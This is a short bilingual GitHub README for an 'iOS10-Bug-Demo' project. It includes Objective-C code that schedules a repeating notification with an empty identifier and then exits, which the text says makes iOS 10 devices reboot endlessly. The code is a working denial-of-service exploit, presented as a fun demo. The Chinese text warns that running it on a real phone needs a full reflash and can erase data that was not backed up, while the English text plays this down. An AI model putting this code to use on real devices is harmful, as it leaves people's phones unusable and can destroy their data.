iOS10-Bug-Demo
==============
[![preview](https://travis-ci.org/Joker-388/MessageImageCategory.svg?branch=master)](http://www.sixstr.me)&nbsp;<br><br>
[![preview](https://github.com/Joker-388/iOS10-Bug-Demo/blob/master/Preview/crash1.gif)](http://www.sixstr.me)&nbsp;
<br><br>
让iOS系统崩溃无限黑屏重启，这里分享一下Demo，建议在虚拟机跑，无限重启后选择虚拟机reset content and settings就可以恢复。

友情提示：别在真机跑，不然真机也会无限重启，只能通过iTunes调试模式重新刷机恢复，数据未备份会全部丢失。

觉得好玩顺手点一个star，前期说谢谢啦。
==============

<br/>
---
使用方法：
==============
1.点击准备按钮，同意app发送通知。<br>
2.点击开始按钮，app崩溃，设备无限黑屏重启。<br>

<br/>
---
English
==============
Let ios10 crash and restart by circle. You can try it both on simulator and device.<br>
Tip: If you run it on device, you can only reinstall the system with iTunes. <br>
1.Click ready button, allow app authorization.<br>
2.Click start button, app clash, and device restart again and again.<br>
<br/>
---
Code
==============
 ```objective-c		 
     UNMutableNotificationContent *content = [[UNMutableNotificationContent alloc] init];		
     content.badge = @2;		
     content.body = @"body";		
     content.sound = [UNNotificationSound defaultSound];		
     content.subtitle = @"subtitle";		
     content.title = @"title";		
     		
     NSDate *date = [NSDate new];		
     NSDateFormatter *formatter = [NSDateFormatter new];		
     [formatter setDateFormat:@"yyyy"];		
     NSInteger currentYear=[[formatter stringFromDate:date] integerValue];		
     [formatter setDateFormat:@"MM"];		
     NSInteger currentMonth=[[formatter stringFromDate:date]integerValue];		
     [formatter setDateFormat:@"dd"];		
     NSInteger currentDay=[[formatter stringFromDate:date] integerValue];		
     [formatter setDateFormat:@"HH"];		
     NSInteger currentHour=[[formatter stringFromDate:date] integerValue];		
     [formatter setDateFormat:@"mm"];		
     NSInteger currentMinute=[[formatter stringFromDate:date] integerValue];		
     [formatter setDateFormat:@"ss"];		
     NSInteger currentSecond=[[formatter stringFromDate:date] integerValue];		
     		
     if (currentSecond + 2 > 59) {		
         currentMinute = currentMinute + 1;		
         currentSecond = 0;		
     } else {		
         currentSecond = currentSecond + 2;		
     }		
     		
     NSDateComponents *components = [NSDateComponents new];		
     components.year = currentYear;		
     components.month = currentMonth;		
     components.day = currentDay;		
     components.hour = currentHour;		
     components.minute = currentMinute;		
     components.second = currentSecond;		
     		
     UNCalendarNotificationTrigger *trigger = [UNCalendarNotificationTrigger triggerWithDateMatchingComponents:components repeats:YES];		
     UNNotificationRequest *request = [UNNotificationRequest requestWithIdentifier:@"" content:content trigger:trigger];		
     [[UNUserNotificationCenter currentNotificationCenter] addNotificationRequest:request withCompletionHandler:^(NSError * _Nullable error) {		
         exit(0);		
     }];		
 ```

